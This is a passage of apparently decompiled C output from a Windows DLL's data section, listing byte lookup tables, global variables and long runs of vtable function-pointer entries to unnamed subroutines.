  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F'
}; // weak
char byte_100929B0[] = { '\0' }; // weak
char byte_10092AB0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\b',
  '\t',
  '\t',
  '\n',
  '\n',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x10',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x11',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1C'
}; // weak
int dword_10092BB0 = 0; // weak
int dword_10092C28 = 0; // weak
char byte_10092CA0[16] =
{
  '\x19',
  '\x0E',
  '\t',
  '\a',
  '\x05',
  '\x05',
  '\x04',
  '\x04',
  '\x04',
  '\x03',
  '\x03',
  '\x03',
  '\x02',
  '\x02',
  '\x02',
  '\x02'
}; // weak
__int16 word_10092D00[] = { 0 }; // weak
__int16 word_10092D02[] = { 0 }; // weak
__int16 word_10092D04[] = { 0 }; // weak
__int16 word_10092D06[] = { 0 }; // weak
int (__cdecl *off_10092D08[3])(int, int) =
{
  &sub_10032468,
  (int (__cdecl *)(int, int))0x40004,
  (int (__cdecl *)(int, int))0x40008
}; // weak
int dword_10092E7C = 0; // weak
_UNKNOWN unk_10092E90; // weak
_DWORD dword_10092E9C[5] = { 500, 500, 655380, 3, 6291456 }; // weak
_UNKNOWN unk_10092EB0; // weak
_UNKNOWN unk_10092EBC; // weak
unsigned int dword_10092ED8[10] = { 95u, 60000u, 0u, 30000u, 888u, 555u, 30000u, 20000u, 20000u, 4294967295u }; // weak
int (__thiscall *off_10092F00)(void *Block, char) = &unknown_libname_1; // weak
int (__thiscall *off_10092F08)(void *Block, char) = &sub_1000105A; // weak
int (__thiscall *off_10092F10)(void *Block, char) = &sub_10001577; // weak
int (__thiscall *off_10092F18)(void *Block, char) = &sub_1000286A; // weak
int (__thiscall *off_10092F20[2])(void *Block, char) = { &unknown_libname_2, &sub_10001BED }; // weak
int (__thiscall *off_10092F24)(void *Block, char) = &sub_10001BED; // weak
int (__thiscall *off_10092F38)(void *Block, char) = &sub_10003311; // weak
int (__thiscall *off_10092F94)(void *Block, char) = &unknown_libname_3; // weak
int (__thiscall *off_10092FB4)(void *Block, char) = &sub_10002805; // weak
int (__thiscall *off_10092FEC)(void *Block, char) = &unknown_libname_4; // weak
int (__thiscall *off_1009300C[2])(void *Block, char) = { &sub_1000283E, &sub_10002BD0 }; // weak
int (__thiscall *off_10093010)(void *Block, char) = &sub_10002BD0; // weak
int (__thiscall *off_10093030)(void *Block, char) = &sub_10002BEC; // weak
int (__thiscall *off_10093050)(void *Block, char) = &sub_100050BC; // weak
int (__thiscall *off_100930AC)(void *Block, char) = &sub_10004686; // weak
int (__thiscall *off_100930E4)(void *Block, char) = &unknown_libname_5; // weak
int (__thiscall *off_10093104)(void *Block, char) = &unknown_libname_6; // weak
int (__thiscall *off_10093124)(void *Block, char) = &sub_10004A32; // weak
int (__thiscall *off_10093144)(void *Block, char) = &sub_10004A4E; // weak
int (__thiscall *off_10093164)(void *Block, char) = &unknown_libname_7; // weak
int (__thiscall *off_1009316C)(void *Block, char) = &sub_10005390; // weak
int (__thiscall *off_10093178)(void *Block, char) = &sub_10006358; // weak
int (__thiscall *off_100931D4)(void *Block, char) = &sub_10005925; // weak
int (__thiscall *off_1009320C)(void *Block, char) = &unknown_libname_8; // weak
int (__thiscall *off_1009322C)(void *Block, char) = &unknown_libname_9; // weak
int (__thiscall *off_1009324C)(void *Block, char) = &sub_10005338; // weak
int (__thiscall *off_10093258)(void *Block, char) = &sub_10005CD1; // weak
int (__thiscall *off_10093278)(void *Block, char) = &sub_10005CED; // weak
int (__thiscall *off_100932A0)(void *Block, char) = &unknown_libname_10; // weak
int (__thiscall *off_100932A8)(void *Block, char) = &sub_10007D66; // weak
int (__thiscall *off_10093304)(void *Block, char) = &sub_10007414; // weak
int (__thiscall *off_1009333C)(void *Block, char) = &unknown_libname_11; // weak
int (__thiscall *off_1009335C)(void *Block, char) = &unknown_libname_12; // weak
int (__thiscall *off_1009337C)(void *Block, char) = &sub_100077C0; // weak
int (__thiscall *off_1009339C)(void *Block, char) = &sub_100077DC; // weak
int (__thiscall *off_100933BC)(void *Block, char) = &sub_10007EB0; // weak
int (__thiscall *off_100933CC)(void *Block, char) = &sub_10008189; // weak
int (__thiscall *off_100933D8[4])(void *Block, char) = { &sub_10008218, &sub_10008645, &sub_10008F63, &unknown_libname_13 }; // weak
int (__thiscall *off_100933DC[3])(void *Block, char) = { &sub_10008645, &sub_10008F63, &unknown_libname_13 }; // weak
int (__thiscall *off_100933E0[2])(void *Block, char) = { &sub_10008F63, &unknown_libname_13 }; // weak
int (__thiscall *off_100933E4)(void *Block, char) = &unknown_libname_13; // weak
int (*off_1009341C)() = &sub_10008FF4; // weak
int (*off_1009342C)() = &sub_100094DC; // weak
int (*off_1009343C)() = &sub_100096B8; // weak
int (__thiscall *off_1009344C)(void *Block, char) = &sub_10009B50; // weak
int (__thiscall *off_10093478)(void *Block, char) = &sub_1000A423; // weak
int (__thiscall *off_100934B8)(void *Block, char) = &sub_1000A44F; // weak
int (__thiscall *off_100934F0)(void *Block, char) = &unknown_libname_14; // weak
int (__thiscall *off_10093510)(void *Block, char) = &unknown_libname_15; // weak
int (__thiscall *off_10093530)(void *Block, char) = &sub_1000A9F6; // weak
int (__thiscall *off_10093550)(void *Block, char) = &sub_1000AA4F; // weak
int (__stdcall *off_10093570)(char) = &sub_1000BD77; // weak
_UNKNOWN unk_10093578; // weak
int (__thiscall *off_10093580)(void *Block, char) = &sub_1000C08B; // weak
int (__thiscall *off_100935B8)(void *Block, char) = &sub_1000BB7E; // weak
int (__thiscall *off_100935E4[2])(void *Block, char) = { &unknown_libname_17, &unknown_libname_16 }; // weak
int (__thiscall *off_100935E8)(void *Block, char) = &unknown_libname_16; // weak
int (__thiscall *off_10093608)(void *Block, char) = &sub_1000BD3D; // weak
int (__stdcall *off_1009362C)(char) = &sub_1000CB15; // weak
_UNKNOWN unk_10093634; // weak
int (__thiscall *off_1009363C[2])(void *Block, char) = { &sub_10001761, &sub_1000C914 }; // weak
int (__thiscall *off_10093640)(void *Block, char) = &sub_1000C914; // weak
int (__thiscall *off_10093648)(void *Block, char) = &sub_1000E7A0; // weak
int (__thiscall *off_100936A4)(void *Block, char) = &sub_1000DE49; // weak
int (__thiscall *off_100936DC)(void *Block, char) = &sub_1000DE68; // weak
int (__thiscall *off_100936FC)(void *Block, char) = &sub_1000DE88; // weak
int (__thiscall *off_1009371C)(void *Block, char) = &sub_1000E1C1; // weak
int (__thiscall *off_1009373C)(void *Block, char) = &sub_1000E1E0; // weak
int (__thiscall *off_1009375C)(void *Block, char) = &sub_1000ED4C; // weak
int (__thiscall *off_1009376C)(void *Block, char) = &sub_1000E9C2; // weak
int (__thiscall *off_10093788)(void *Block, char) = &sub_1000EA15; // weak
int (__thiscall *off_100937B4)(void *Block, char) = &sub_1000F03E; // weak
int (__thiscall *off_100937C0)(void *Block, char) = &sub_1000FF5E; // weak
int (__thiscall *off_10093810)(void *Block, char) = &sub_1000FF12; // weak
int (__thiscall *off_10093860)(void *Block, char) = &sub_1000F8BE; // weak
int (__thiscall *off_10093898)(void *Block, char) = &sub_1000F8DD; // weak
int (__thiscall *off_100938B8)(void *Block, char) = &sub_1000F8FD; // weak
int (__thiscall *off_100938D8)(void *Block, char) = &sub_1000F91D; // weak
int (__thiscall *off_10093918[2])(void *Block, char) = { &sub_1000F957, &sub_1000FE86 }; // weak
int (__thiscall *off_1009391C)(void *Block, char) = &sub_1000FE86; // weak
int (__thiscall *off_1009393C)(void *Block, char) = &sub_1000FEF3; // weak
int (__thiscall *off_1009395C)(void *Block, char) = &sub_100102E2; // weak
int (__thiscall *off_10093964)(void *Block, char) = &sub_10010507; // weak
int (__thiscall *off_1009396C[2])(void *Block, char) = { &sub_10010447, &sub_1001053D }; // weak
int (__thiscall *off_10093970)(void *Block, char) = &sub_1001053D; // weak
int (__stdcall *off_10093974)(char) = &sub_10010B43; // weak
_UNKNOWN unk_1009397C; // weak
int (__stdcall *off_10093984)(char) = &sub_10010B21; // weak
_UNKNOWN unk_1009398C; // weak
_UNKNOWN unk_10093994; // weak
int (__stdcall *off_1009399C)(char) = &sub_10010AFF; // weak
_UNKNOWN unk_100939A4; // weak
_UNKNOWN unk_100939AC; // weak
int (__thiscall *off_100939B8)(void *Block, char) = &sub_10010614; // weak
int (__thiscall *off_10093A38)(void *Block, char) = &sub_10010D1C; // weak
int (__thiscall *off_10093A78)(void *Block, char) = &sub_10011385; // weak
int (__thiscall *off_10093AB8)(void *Block, char) = &sub_100113BF; // weak
int (__thiscall *off_10093AF0)(void *Block, char) = &sub_100113DE; // weak
int (__thiscall *off_10093B10)(void *Block, char) = &sub_100113FE; // weak
int (__thiscall *off_10093B30)(void *Block, char) = &sub_100118E8; // weak
int (__thiscall *off_10093B50)(void *Block, char) = &sub_10011907; // weak
int (__stdcall *off_10093B70)(char) = &sub_10011DF7; // weak
_UNKNOWN unk_10093B78; // weak
_UNKNOWN unk_10093B80; // weak
int (__stdcall *off_10093B88)(char) = &sub_1001263C; // weak
_UNKNOWN unk_10093B90; // weak
_UNKNOWN unk_10093B98; // weak
int (__stdcall *off_10093BA0)(char) = &sub_1001280B; // weak
_UNKNOWN unk_10093BA8; // weak
_UNKNOWN unk_10093BB0; // weak
int (__thiscall *off_10093BB8)(void *Block, char) = &sub_10011BBC; // weak
int (__thiscall *off_10093C2C)(void *Block, char) = &sub_10012962; // weak
int (__thiscall *off_10093C34[4])(void *Block, char) = { &sub_100129A3, &sub_10012A30, &sub_10012B88, &sub_10012E25 }; // weak
int (__thiscall *off_10093C38[3])(void *Block, char) = { &sub_10012A30, &sub_10012B88, &sub_10012E25 }; // weak
int (__thiscall *off_10093C3C[2])(void *Block, char) = { &sub_10012B88, &sub_10012E25 }; // weak
int (__thiscall *off_10093C40)(void *Block, char) = &sub_10012E25; // weak
int (__thiscall *off_10093C48)(void *Block, char) = &sub_1001371A; // weak
int (__thiscall *off_10093C50)(void *Block, char) = &sub_10012E88; // weak
int (__thiscall *off_10093C58)(void *Block, char) = &sub_1001310B; // weak
int (*off_10093C84[5])() = { &sub_10013C13, &sub_10013C3A, &sub_10013C8D, &sub_10013C61, &sub_10013CD1 }; // weak
int (__thiscall *off_10093CAC[2])(void *Block, char) = { &sub_100143BA, &sub_100141B0 }; // weak
int (__thiscall *off_10093CB0)(void *Block, char) = &sub_100141B0; // weak
int (__thiscall *off_10093CC8[3])(void *Block, char) = { &sub_10014431, &sub_100146BE, &sub_100148DC }; // weak
int (__thiscall *off_10093CCC[2])(void *Block, char) = { &sub_100146BE, &sub_100148DC }; // weak
int (__thiscall *off_10093CD0)(void *Block, char) = &sub_100148DC; // weak
int (__thiscall *off_10093CE0[6])(void *Block, char) =
{
  &sub_10014D01,
  &sub_1001573A,
  &sub_10015759,
  &sub_10015778,
  &sub_10015102,
  &sub_100152A5
}; // weak
int (__thiscall *off_10093CE4[5])(void *Block, char) = { &sub_1001573A, &sub_10015759, &sub_10015778, &sub_10015102, &sub_100152A5 }; // weak
int (__thiscall *off_10093CE8[4])(void *Block, char) = { &sub_10015759, &sub_10015778, &sub_10015102, &sub_100152A5 }; // weak
int (__thiscall *off_10093CEC[3])(void *Block, char) = { &sub_10015778, &sub_10015102, &sub_100152A5 }; // weak
int (__thiscall *off_10093CF0[2])(void *Block, char) = { &sub_10015102, &sub_100152A5 }; // weak
int (__thiscall *off_10093CF4)(void *Block, char) = &sub_100152A5; // weak
int (__thiscall *off_10093CFC)(void *Block, char) = &sub_10015A58; // weak
int (__thiscall *off_10093D04)(void *Block, char) = &sub_10015D95; // weak
void (__noreturn *off_10093D08)() = &_purecall; // weak
int (__thiscall *off_10093D0C)(void *Block, char) = &sub_10016422; // weak
int (__thiscall *off_10093D14)(void *Block, char) = &sub_1001654D; // weak
int (__thiscall *off_10093D1C)(void *Block, char) = &sub_100164DC; // weak
int (__thiscall *off_10093D24)(void *Block, char) = &sub_100167BC; // weak
int (__thiscall *off_10093D2C[3])(void *Block, char) = { &sub_100169E9, &sub_1001689F, &sub_10017031 }; // weak
int (__thiscall *off_10093D30[2])(void *Block, char) = { &sub_1001689F, &sub_10017031 }; // weak
int (__thiscall *off_10093D34)(void *Block, char) = &sub_10017031; // weak
int (__thiscall *off_10093D44[3])(void *Block, char) = { &sub_1001716D, &sub_100171D3, &sub_10017130 }; // weak
int (__thiscall *off_10093D48[2])(void *Block, char) = { &sub_100171D3, &sub_10017130 }; // weak
int (__thiscall *off_10093D4C)(void *Block, char) = &sub_10017130; // weak
int (__thiscall *off_10093D54)(void *Block, char) = &sub_100177A4; // weak
int (__thiscall *off_10093D5C)(void *Block, char) = &sub_100174A0; // weak
int (__thiscall *off_10093D78)(void *Block, char) = &sub_10017292; // weak
int (__thiscall *off_10093D88)(void *Block, char) = &sub_10017910; // weak
int (__thiscall *off_10093D98[2])(void *Block, char) = { &sub_1001795D, &sub_10017DA4 }; // weak
int (__thiscall *off_10093D9C)(void *Block, char) = &sub_10017DA4; // weak
int (__thiscall *off_10093DCC)(void *Block, char) = &sub_1001801F; // weak
int (__cdecl *off_10093DF0[2])(int, int) = { &sub_10018133, &sub_1001818B }; // weak
int (__thiscall *off_10093E18)(void *Block, char) = &sub_100183BB; // weak
int (__thiscall *off_10093E80)(void *Block, char) = &sub_1001831D; // weak
int (__stdcall *off_10093EE4)(char) = &sub_10018D66; // weak
_UNKNOWN unk_10093EEC; // weak
int (__thiscall *off_10093EF8)(void *Block, char) = &sub_10018B2B; // weak
int (__thiscall *off_10093F68)(void *Block, char) = &sub_10019F97; // weak
int (__thiscall *off_10093F78)(void *Block, char) = &sub_1001A6AB; // weak
int (__thiscall *off_10093F90)(void *Block, char) = &sub_1001A685; // weak
int (__thiscall *off_10093FA8)(void *Block, char) = &sub_1001A7AF; // weak
int (__thiscall *off_10093FC0)(void *Block, char) = &sub_1001A789; // weak
int (__thiscall *off_10093FD8[2])(void *Block, char) = { &sub_1001AA0F, &sub_1001B2D7 }; // weak
int (__thiscall *off_10093FDC)(void *Block, char) = &sub_1001B2D7; // weak
int (__thiscall *off_10093FE4)(void *Block, char) = &sub_1001B16C; // weak
int (__thiscall *off_10093FEC)(void *Block, char) = &sub_1001BFD4; // weak
int (__thiscall *off_10093FFC)(void *Block, char) = &sub_1001C104; // weak
int (__thiscall *off_1009400C)(void *Block, char) = &sub_1001C217; // weak
int (__thiscall *off_1009401C)(void *Block, char) = &sub_1001C72F; // weak
int (__thiscall *off_10094024)(void *Block, char) = &sub_1001C60B; // weak
int (__thiscall *off_1009402C)(void *Block, char) = &sub_1001C7DE; // weak
int (__stdcall *off_1009403C)(char) = &sub_1001CBEF; // weak
_UNKNOWN unk_10094044; // weak
int (__thiscall *off_10094050)(void *Block, char) = &sub_1001C894; // weak
int (__thiscall *off_100940A8)(void *Block, char) = &sub_1001CC7B; // weak
int (__thiscall *off_100940FC)(void *Block, char) = &sub_1001CE80; // weak
int (__thiscall *off_10094130)(void *Block, char) = &sub_1001D317; // weak
int (__thiscall *off_10094148)(void *Block, char) = &sub_1001D5E4; // weak
int (__thiscall *off_10094168)(void *Block, char) = &sub_1001DBB9; // weak
int (__thiscall *off_100941B8[2])(void *Block, char) = { &sub_1001DAB3, &sub_10020697 }; // weak
int (__thiscall *off_100941BC)(void *Block, char) = &sub_10020697; // weak
int (__thiscall *off_100941E0)(void *Block, char) = &sub_1001EEC1; // weak
int (__thiscall *off_1009420C[2])(void *Block, char) = { &sub_1001F7A7, &sub_1001EEE0 }; // weak
int (__thiscall *off_10094210)(void *Block, char) = &sub_1001EEE0; // weak
int (__thiscall *off_10094230)(void *Block, char) = &sub_1001EF00; // weak
int (__thiscall *off_10094250)(void *Block, char) = &sub_1001EF20; // weak
int (__thiscall *off_10094270)(void *Block, char) = &sub_1002063A; // weak
int (__thiscall *off_100942CC)(void *Block, char) = &sub_10020678; // weak
int (__thiscall *off_10094308)(void *Block, char) = &sub_10020659; // weak
int (__thiscall *off_10094364)(void *Block, char) = &sub_1001EF40; // weak
int (__thiscall *off_1009439C)(void *Block, char) = &sub_1001EF5F; // weak
int (__thiscall *off_100943BC)(void *Block, char) = &sub_1001EF7F; // weak
int (__thiscall *off_100943F4)(void *Block, char) = &sub_1001EF9E; // weak
int (__thiscall *off_10094414)(void *Block, char) = &sub_1001F787; // weak
int (__thiscall *off_10094434)(void *Block, char) = &sub_1001F7C7; // weak
int (__thiscall *off_10094454)(void *Block, char) = &sub_1001F7E6; // weak
int (__thiscall *off_10094474)(void *Block, char) = &sub_1001F805; // weak
int (__thiscall *off_10094494)(void *Block, char) = &sub_1001F824; // weak
int (__thiscall *off_100946C8)(void *Block, char) = &sub_10021D17; // weak
int (__stdcall *off_100946CC)(char) = &sub_10021612; // weak
_UNKNOWN unk_100946D4; // weak
_UNKNOWN unk_100946DC; // weak
int (__stdcall *off_100946E4)(char) = &sub_1002173D; // weak
_UNKNOWN unk_100946EC; // weak
_UNKNOWN unk_100946F4; // weak
int (__thiscall *off_10094700)(void *Block, char) = &sub_10021DFD; // weak
int (__thiscall *off_10094738)(void *Block, char) = &sub_100221EA; // weak
int (__thiscall *off_1009475C)(void *Block, char) = &sub_10022381; // weak
int (__thiscall *off_1009478C)(void *Block, char) = &sub_1002251E; // weak
int (__thiscall *off_10094794)(void *Block, char) = &sub_1002259D; // weak
int (__thiscall *off_100947C4)(void *Block, char) = &sub_10022D89; // weak
int (__thiscall *off_100947CC)(void *Block, char) = &sub_100261FD; // weak
int (__thiscall *off_100947E8)(void *Block, char) = &sub_100261DE; // weak
int (__thiscall *off_10094844)(void *Block, char) = &sub_10025709; // weak
int (__thiscall *off_1009487C)(void *Block, char) = &sub_10025728; // weak
int (__thiscall *off_1009489C)(void *Block, char) = &sub_10025748; // weak
int (__thiscall *off_100948BC)(void *Block, char) = &sub_10025AB6; // weak
int (__thiscall *off_100948DC)(void *Block, char) = &sub_10025AD5; // weak
int (__thiscall *off_100948FC[2])(void *Block, char) = { &sub_1002651B, &sub_10026BCA }; // weak
int (__thiscall *off_10094900)(void *Block, char) = &sub_10026BCA; // weak
int (__thiscall *off_10094940)(void *Block, char) = &sub_10026C04; // weak
int (__thiscall *off_10094978)(void *Block, char) = &sub_10026C23; // weak
int (__thiscall *off_10094998)(void *Block, char) = &sub_10026C43; // weak
int (__thiscall *off_100949B8)(void *Block, char) = &sub_1002714F; // weak
int (__thiscall *off_100949D8)(void *Block, char) = &sub_1002716E; // weak
int (__thiscall *off_100949F8)(void *Block, char) = &sub_100278EA; // weak
int (__stdcall *off_100949FC)(char) = &sub_10027E37; // weak
_UNKNOWN unk_10094A04; // weak
_UNKNOWN unk_10094A0C; // weak
int (__stdcall *off_10094A14)(char) = &sub_10027F6E; // weak
_UNKNOWN unk_10094A1C; // weak
int (__thiscall *off_10094A24)(void *Block, char) = &sub_10028556; // weak
int (__thiscall *off_10094A2C)(void *Block, char) = &sub_100287D9; // weak
int (__stdcall *off_10094A58)(int) = &sub_10028ED9; // weak
int (__thiscall *off_10094A84)(void *Block, char) = &sub_10028711; // weak
int (__thiscall *off_10094A8C)(void *Block, char) = &sub_10028F97; // weak
int (__thiscall *off_10094AE0[6])(void *Block, char) =
{
  &sub_10029587,
  &sub_100295C5,
  &sub_100295A6,
  &sub_100295E4,
  &sub_10029603,
  &sub_100299E7
}; // weak
int (__thiscall *off_10094AE4[5])(void *Block, char) = { &sub_100295C5, &sub_100295A6, &sub_100295E4, &sub_10029603, &sub_100299E7 }; // weak
int (__thiscall *off_10094AE8[4])(void *Block, char) = { &sub_100295A6, &sub_100295E4, &sub_10029603, &sub_100299E7 }; // weak
int (__thiscall *off_10094AEC[3])(void *Block, char) = { &sub_100295E4, &sub_10029603, &sub_100299E7 }; // weak
int (__thiscall *off_10094AF0[2])(void *Block, char) = { &sub_10029603, &sub_100299E7 }; // weak
int (__thiscall *off_10094AF4)(void *Block, char) = &sub_100299E7; // weak
int (__thiscall *off_10094AFC[2])(void *Block, char) = { &sub_10029C87, &sub_10029BE4 }; // weak
int (__thiscall *off_10094B00)(void *Block, char) = &sub_10029BE4; // weak
int (__thiscall *off_10094B08)(void *Block, char) = &sub_1002A0B2; // weak
int (__thiscall *off_10094B10)(void *Block, char) = &sub_1002A0F5; // weak
int (__thiscall *off_10094B18)(void *Block, char) = &sub_1002A138; // weak
int (__thiscall *off_10094B20[2])(void *Block, char) = { &sub_1002A197, &sub_1002A386 }; // weak
int (__thiscall *off_10094B24)(void *Block, char) = &sub_1002A386; // weak
int (__thiscall *off_10094B30)(void *Block, char) = &sub_1002A3F3; // weak
int (__thiscall *off_10094B64)(void *Block, char) = &sub_1002A5C9; // weak
int (__thiscall *off_10094B94)(void *Block, char) = &sub_1002AAAE; // weak
int (__thiscall *off_10094BA0)(void *Block, char) = &sub_1002A9B9; // weak
wchar_t word_10094BAC[2] = { 0u, 0u }; // weak
int (__thiscall *off_10094BB0)(void *Block, char) = &sub_1002B5B8; // weak
int (__thiscall *off_10094BBC)(void *Block, char) = &sub_1002D3AC; // weak
int (__thiscall *off_10094BF4)(void *Block, char) = &sub_1002C34F; // weak
int (__thiscall *off_10094C20[2])(void *Block, char) = { &sub_1002C89C, &sub_1002C36E }; // weak
int (__thiscall *off_10094C24)(void *Block, char) = &sub_1002C36E; // weak
int (__thiscall *off_10094C44)(void *Block, char) = &sub_1002C38E; // weak
int (__thiscall *off_10094C68)(void *Block, char) = &sub_1002D383; // weak
int (__thiscall *off_10094CC4)(void *Block, char) = &sub_1002C3AE; // weak
int (__thiscall *off_10094CFC)(void *Block, char) = &sub_1002C3CD; // weak
int (__thiscall *off_10094D1C)(void *Block, char) = &sub_1002C87C; // weak
int (__thiscall *off_10094D3C)(void *Block, char) = &sub_1002C8BB; // weak
int (__thiscall *off_10094D5C)(void *Block, char) = &sub_1002C8DA; // weak
int (__stdcall *off_10094D7C)(char) = &sub_1002D934; // weak
_UNKNOWN unk_10094D84; // weak
int (__stdcall *off_10094D8C)(char) = &sub_1002E4CD; // weak
_UNKNOWN unk_10094D94; // weak
int (__thiscall *off_10094D9C)(void *Block, char) = &sub_1002DDBD; // weak
int (__thiscall *off_10094DAC[2])(void *Block, char) = { &sub_1002E8DB, &sub_1002E9F1 }; // weak
int (__thiscall *off_10094DB0)(void *Block, char) = &sub_1002E9F1; // weak
int (__thiscall *off_10094DB8)(void *Block, char) = &sub_1002EB1C; // weak
int (__thiscall *off_10094DC0[2])(void *Block, char) = { &sub_1002EFF3, &sub_1002F05E }; // weak
int (__thiscall *off_10094DC4)(void *Block, char) = &sub_1002F05E; // weak
int (__thiscall *off_10094DCC)(void *Block, char) = &sub_1002F303; // weak
int (__thiscall *off_10094E00)(void *Block, char) = &sub_1002F496; // weak
int (__thiscall *off_10094E2C)(void *Block, char) = &sub_1002F5E7; // weak
int (__thiscall *off_10094E5C)(void *Block, char) = &sub_1002F635; // weak
int (__thiscall *off_10094E8C)(void *Block, char) = &sub_1002F85B; // weak
int (__thiscall *off_10094E94)(void *Block, char) = &sub_1002FDA1; // weak
int (__thiscall *off_10094E9C)(void *Block, char) = &sub_1002F9B9; // weak
int (__thiscall *off_10094EA4)(void *Block, char) = &sub_1002FB8C; // weak
int (__thiscall *off_10094EAC)(void *Block, char) = &sub_1002F83C; // weak
int (__thiscall *off_10094EB4[4])(void *Block, char) = { &sub_1003073D, &sub_10030D92, &sub_10030FEF, &sub_10030C4D }; // weak
int (__thiscall *off_10094EB8[3])(void *Block, char) = { &sub_10030D92, &sub_10030FEF, &sub_10030C4D }; // weak
int (__thiscall *off_10094EBC[2])(void *Block, char) = { &sub_10030FEF, &sub_10030C4D }; // weak
int (__thiscall *off_10094EC0)(void *Block, char) = &sub_10030C4D; // weak
int (__thiscall *off_10094EC8)(void *Block, char) = &sub_10032C73; // weak
void (__noreturn *off_10094ECC)() = &_purecall; // weak
int (__stdcall *off_10094ED0)(char) = &sub_10033443; // weak
_UNKNOWN unk_10094ED8; // weak
int (*off_10094EE0)() = &sub_1003A011; // weak
int (__stdcall *off_10094EE4)(char) = &sub_10033421; // weak
_UNKNOWN unk_10094EEC; // weak
_UNKNOWN unk_10094EF4; // weak
int (__thiscall *off_10094EFC)(void *Block, char) = &sub_10032D22; // weak
int (__thiscall *off_10094F04[2])(void *Block, char) = { &sub_100334EA, &sub_100335B2 }; // weak
int (__thiscall *off_10094F08)(void *Block, char) = &sub_100335B2; // weak
int (__thiscall *off_10094F10)(void *Block, char) = &sub_10033739; // weak
void (__noreturn *off_10094F54)() = &_purecall; // weak
int (__thiscall *off_10094F68)(void *Block, char) = &sub_100338C3; // weak
int (__thiscall *off_10094F7C[2])(void *Block, char) = { &sub_10033B31, &sub_10033E4A }; // weak
int (__thiscall *off_10094F80)(void *Block, char) = &sub_10033E4A; // weak
int (__thiscall *off_10094F94)(void *Block, char) = &sub_1003486C; // weak
int (__thiscall *off_10094FB8)(void *Block, char) = &sub_10034317; // weak
int (__thiscall *off_10094FE4[2])(void *Block, char) = { &sub_10034447, &sub_10034336 }; // weak
int (__thiscall *off_10094FE8)(void *Block, char) = &sub_10034336; // weak
int (__thiscall *off_10095008)(void *Block, char) = &sub_1003484D; // weak
int (__thiscall *off_10095040)(void *Block, char) = &sub_10034427; // weak
int (__thiscall *off_10095060[5])(void *Block, char) = { &sub_10034A28, &sub_1003509F, &sub_1003510E, &sub_100351EC, &sub_10034CA0 }; // weak
int (__thiscall *off_10095064[4])(void *Block, char) = { &sub_1003509F, &sub_1003510E, &sub_100351EC, &sub_10034CA0 }; // weak
